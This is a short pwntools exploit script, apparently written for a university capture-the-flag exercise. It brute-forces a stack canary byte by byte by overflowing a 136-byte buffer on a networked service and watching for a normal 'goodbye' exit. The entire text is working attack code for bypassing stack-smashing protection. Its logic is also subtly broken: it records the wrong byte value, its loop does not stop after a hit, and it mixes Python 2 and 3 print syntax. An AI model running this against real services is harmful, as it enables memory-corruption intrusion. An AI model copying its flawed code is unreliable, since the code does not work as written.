#find canary
from pwn import *
stk_canary= ""
byteguess = 0x0
buff = ""
buff = buff + "A"*136
buff = buff + stk_canary
i=0
while i < 8:
 while byteguess != 0xff:
   p = remote('127.0.0.1', 8000)
  # p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1340)
   #p.recv()
   #p.send("aa6243\n")
   p.recv()
   p.send("500")
   #gdb.attach(p)
   p.recv()
   p.send(buff + chr(byteguess))

   #if the program exits normally
   if("goodbye" in str(p.recv())):
     print("Guessed correct byte:", format(byteguess, '02x'))
     stk_canary = stk_canary + chr(byteguess)
     buff = buff + chr(byteguess)
     byteguess = 0x0
     i=i+1
     f = open("brutty.txt", "a+")
     f.write(format(byteguess, '02x'))
     print("Alhamdulillah")

   #if the program exits abruptly
   else:
     byteguess = byteguess + 1
     print("Alhamdulillahi ala kuli haal")
   p.close()
print "Canary:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in stk_canary)
print "Hexdump:", hexdump(stk_canary)
